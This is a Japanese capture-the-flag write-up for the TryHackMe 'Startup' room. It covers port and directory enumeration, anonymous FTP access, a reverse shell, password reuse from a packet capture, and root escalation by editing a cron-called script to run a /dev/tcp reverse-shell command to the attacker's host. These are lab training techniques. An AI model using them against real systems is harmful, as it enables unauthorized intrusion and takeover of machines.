# Startup CTF

https://tryhackme.com/room/startup

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.19.80
root@ip-10-10-214-121:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-25 05:43 GMT
Nmap scan report for 10.10.19.80
Host is up (0.0100s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:E8:A6:B5:02:79 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.52 seconds
root@ip-10-10-214-121:~# sudo nmap -sV -p21,22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-25 05:43 GMT
Nmap scan report for 10.10.19.80
Host is up (0.00016s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:E8:A6:B5:02:79 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-214-121:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.19.80
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 310] [--> http://10.10.19.80/files/]
/.php                 (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

/files の内容は、下記の FTP の内容と同じ。

## FTP

anonymous でログインできるので一括ダウンロード。

```shell
$ wget -r --user="anonymous" --password="" ftp://10.10.19.80/

$ ls -al
total 268
drwxrwxr-x 3 kali kali   4096 Feb 25 00:46 .
drwxrwxr-x 4 kali kali   4096 Feb 25 00:46 ..
drwxrwxr-x 2 kali kali   4096 Feb 25 00:46 ftp
-rw-rw-r-- 1 kali kali 251631 Nov 12  2020 important.jpg
-rw-rw-r-- 1 kali kali    208 Nov 12  2020 notice.txt
-rw-rw-r-- 1 kali kali      5 Nov 12  2020 .test.log
```

```shell
$ cat notice.txt
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

$ cat .test.log
test
```

Maya というキーワードだけは気になる。

binwalk で zlib ファイルが出てきたが、正常に展開できなかった。

```shell
$ binwalk -Me ./important.jpg

$ ls -al _important.jpg.extracted
total 256
drwxrwxr-x 2 kali kali   4096 Feb 25 00:49 .
drwxrwxr-x 4 kali kali   4096 Feb 25 00:49 ..
-rw-rw-r-- 1 kali kali      0 Feb 25 00:49 39
-rw-rw-r-- 1 kali kali 251574 Feb 25 00:49 39.zlib
```

zlib-flate を使用

```shell
$ zlib-flate -uncompress < 39.zlib > 39

$ file 39
39: SVR2 pure executable (USS/370)
```

よく分からないファイルができた。

FTP が HTTP の/files を参照しているということは、PHP をアップロードできるのでは？

```shell
$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.19.80] 34812

$ whoami
whoami
www-data

$ ls -al /home
ls -al /home
total 12
drwxr-xr-x  3 root   root   4096 Nov 12  2020 .
drwxr-xr-x 25 root   root   4096 Feb 25 05:40 ..
drwx------  4 lennie lennie 4096 Nov 12  2020 lennie
```

リバースシェルを取れた。権限昇格する必要がある。

## 権限昇格１

lennie 所有のファイル

```shell
$ find / -user lennie -type f 2>/dev/null
find / -user lennie -type f 2>/dev/null
/etc/print.sh

$ ls -al /etc/print.sh
ls -al /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

気になるが内容は分からない。

```shell
$ find / -type f -exec grep -i -I "secret" {} /dev/null \; 2>/dev/null
find / -type f -exec grep -i -I "secret" {} /dev/null \; 2>/dev/null
/recipe.txt:Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
（略）
```

/recipe.txt を発見

```shell
$ ls -al /
ls -al /
total 100
drwxr-xr-x  25 root     root      4096 Feb 25 05:40 .
drwxr-xr-x  25 root     root      4096 Feb 25 05:40 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Feb 25 05:40 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 124 root     root         0 Feb 25 05:40 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       920 Feb 25 06:41 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Feb 25 05:40 sys
drwxrwxrwt   7 root     root      4096 Feb 25 06:44 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
```

/incidents ディレクトリ

```shell
$ ls -al
ls -al
total 40
drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
drwxr-xr-x 25 root     root      4096 Feb 25 05:40 ..
-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```

パケットキャプチャファイルがあった。  
ローカルにコピーして Wireshark で開いた。

TCP ストリームを見ると、次のようなコマンド入力があった。

```text
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: <secret>

Sorry, try again.
[sudo] password for www-data:

Sorry, try again.
[sudo] password for www-data: <secret>

sudo: 3 incorrect password attempts
```

lennie のパスワードだった。

```shell
$ su lennie
su lennie
Password: <secret>

lennie@startup:/var/www/html/files/ftp$ cat /home/lennie/user.txt
cat /home/lennie/user.txt
THM{03ce...............}
```

ユーザーフラグゲット。

## 権限昇格２

```shell
ls -al scripts
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Feb 25 07:39 startup_list.txt

lennie@startup:~$ cat scripts/planner.sh
cat scripts/planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

plannner.sh がどこから実行されているかは不明だが、startup_list.txt のタイムスタンプを見ると、毎分実行されていると思われる。

```shell
lennie@startup:~$ cat /etc/print.sh
cat /etc/print.sh
#!/bin/bash
echo "Done!"
```

/etc/print.sh は lennie オーナーなので、root で実行させるのは簡単。

```shell
$ nano /etc/print.sh
$ cat /etc/print.sh
#!/bin/bash
sh -i >& /dev/tcp/10.2.22.182/8888 0>&1
```

リバースシェル

```shell
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.19.80] 34872
sh: 0: can't access tty; job control turned off
# whoami
root
# cat root.txt
THM{f96............}
```

ルートフラグゲット！

ちなみに、cron で設定されていた。

```shell
# find / -type f -exec grep -i -I "planner.sh" {} /dev/null \; 2>/dev/null
/var/spool/cron/crontabs/root:* * * * * /home/lennie/scripts/planner.sh
```

## 振り返り

- FTP で PHP をアップロードするパターンは初めて。
- Wireshark で TCP ストリームを表示する方法を最初知らなかったので苦労した。良い学びだった。
